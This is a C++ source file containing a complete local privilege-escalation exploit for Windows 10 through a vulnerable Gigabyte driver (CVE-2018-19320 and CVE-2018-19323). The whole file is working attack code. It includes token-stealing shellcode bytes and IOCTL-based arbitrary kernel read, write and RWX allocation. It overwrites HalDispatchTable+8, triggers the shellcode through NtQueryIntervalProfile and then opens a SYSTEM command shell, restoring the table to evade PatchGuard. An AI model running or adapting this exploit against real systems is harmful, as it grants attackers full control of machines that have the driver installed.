#include "Common.h"
#include "Exploits.h"

/*
   Gigabyte Driver CVE-2018-19320 + CVE-2018-19323 / Low Integrity

   Author: @xct_de
   Target: 10.0.19044

   - Leak _KTHREAD (MSR read to get KPCR)
   - Allocate & Write Shellcode to executeable memory
   - Dispatch table overwrite (+8)
   - Restore Dispatch Table (so PatchGuard does not complain)
*/

namespace GigabyteDriverLINS {

	// Token Stealing SC without Overflow Cleanup (since we overwrite HalDispatchTable)
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0xc3, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	// reads from where (ptr)
	QWORD arbRead(QWORD where, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		LPVOID readBuffer = VirtualAlloc(NULL, 0x8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		_Memcpy memCpy = { (QWORD)readBuffer, where, 8 }; // copy where to readbuffer

		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbRead (IOCTL)\n");
			exit(-1);
		}
		return *((QWORD*)readBuffer);
	}

	// writes what (ptr) to where (ptr)
	VOID arbWrite(QWORD where, QWORD what, DWORD size, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _Memcpy {
			QWORD dest;
			QWORD src;
			DWORD size;
		} _Memcpy;

		_Memcpy memCpy = { where , what, size }; // copy src to dst
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&memCpy, sizeof(memCpy), NULL, 0, NULL, NULL)) {
			printf("[-] Error in arbWrite (IOCTL)\n");
			exit(-1);
		}
	}

	// reads msr and returns value
	QWORD msrRead(DWORD reg, HANDLE hDriver, DWORD IOCTL) {
		typedef struct _MSRIO {
			DWORD rw; // 1 is read, 0 is write			
			DWORD reg;
			QWORD value;
		} _MSRIO;

		_MSRIO inBuf = { 1, reg };
		QWORD outBuf[2] = { 0 };

		DWORD bytesReturned = 0;
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&inBuf, sizeof(inBuf), (LPVOID)outBuf, sizeof(outBuf), &bytesReturned, NULL)) {
			printf("[-] Error in msrRead (IOCTL)\n");
			exit(-1);
		}
		return outBuf[1];
	}

	// allocates size in kernel memory
	QWORD allocRWX(DWORD size, HANDLE hDriver, DWORD IOCTL) {
		
		DWORD inBuf = size;
		QWORD outBuf[2] = { 0 };

		DWORD bytesReturned = 0;
		if (!DeviceIoControl(hDriver, IOCTL, (LPVOID)&inBuf, sizeof(inBuf), (LPVOID)outBuf, sizeof(outBuf), &bytesReturned, NULL)) {
			printf("[-] Error in allocRWX (IOCTL)\n");
			exit(-1);
		}
		return outBuf[0];
	}

	void Exploit(int argc, char** argv) {
		DWORD IoReadMSR = 0xC3502580;
		DWORD IoAllocateRWX = 0xC3502800;
		DWORD IoMemcpy = 0xC3502808;
		// LSTAR, The kernel's RIP SYSCALL entry for 64 bit software (https://wiki.osdev.org/SYSENTER)
		DWORD regLstar = 0xC0000082;
		// Kernel Process Control Region (KPCR, in shellcode referenced via GS)
		DWORD regGS = 0xC0000101;
		DWORD LSTAR_BASE_OFFSET = 0x408AC0;

		HANDLE hDriver = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hDriver == INVALID_HANDLE_VALUE)
		{
			printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
			exit(1);
		}

		// use vuln to read MSR container a kernel pointer
		QWORD IA32_LSTAR = msrRead(regLstar, hDriver, IoReadMSR);
		printf("[*] IA32_LSTAR: %llx (nt!KiSystemCall64)\n", IA32_LSTAR);
		// calculate kernel base (static offset from printing with getBaseAddr and subtracting)
		QWORD ntBase = IA32_LSTAR - LSTAR_BASE_OFFSET;
		printf("[>] Nt base: %p\n", ntBase);

		// get gs register to find _KTHREAD from KPRCB (like we do in shellcode
		QWORD GS = msrRead(regGS, hDriver, IoReadMSR);
		printf("[*] GS: %llx\n", GS);
		QWORD kThread = GS + 0x188;
		printf("[>] _KTHREAD: %p\n", kThread);

		// Allocate a block of RWX via MmAllocateContiguousMemory
		QWORD sc_ptr = allocRWX(0x1000, hDriver, IoAllocateRWX);
		printf("[>] Allocated kernel rwx memory @ %llx\n", sc_ptr);

		// Copy in our shellcode with Arbitrary Write (we can not RtlCopyMemory from user to kernel mode)
		arbWrite(sc_ptr, (QWORD)&sc, 256, hDriver, IoMemcpy);

		// Find HalDispatchTable by getting the offset from the file & mapping it to the kernel base address
		HMODULE ntHandle = LoadLibraryA("ntoskrnl.exe");
		QWORD halDispatchTableUserAddr = (QWORD)GetProcAddress(ntHandle, "HalDispatchTable");
		printf("[>] HalDispatchTableUserAddr: 0x%llx\n", halDispatchTableUserAddr);
		QWORD halDispatchTableOffset = halDispatchTableUserAddr - (QWORD)ntHandle;
		printf("[>] HalDispatchTableOffset: 0x%llx\n", halDispatchTableOffset);
		QWORD halDispatchTableKernelAddress = halDispatchTableOffset + ntBase;
		printf("[>] HalDispatchTableKernelAddr: 0x%llx\n", halDispatchTableKernelAddress);

		// store old hal+8 for cleanup
		QWORD oldHALPtr = arbRead(halDispatchTableKernelAddress + 0x8, hDriver, IoMemcpy);

		// write sc ptr to hal+8 (we cannot pass the pointer directly but need to pass a pointer to the pointer)
		QWORD scPtrBuf = sc_ptr;
		arbWrite(halDispatchTableKernelAddress + 8, (QWORD)&scPtrBuf, 8, hDriver, IoMemcpy);
		printf("[>] Replaced NtQueryIntervalProfile @ HAL+8 with ptr to shellcode\n");

		//getchar();
		//DebugBreak();

		// trigger
		_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
		ULONG temp;
		NtQueryIntervalProfile(0x10, &temp);

		system("cmd.exe");

		// restore hal+8 so PatchGuard is happy
		QWORD oldHALPtrBuf = oldHALPtr;
		arbWrite(halDispatchTableKernelAddress + 8, (QWORD)&oldHALPtrBuf, 8, hDriver, IoMemcpy);
		printf("[>] Restored HAL\n");

		CloseHandle(hDriver);
	}
}


int GigabyteDriverLI(int argc, char** argv) {
	printf("[*] Running GigabyteDriver02\n");
	GigabyteDriverLINS::Exploit(argc, argv);	
	return 0;
}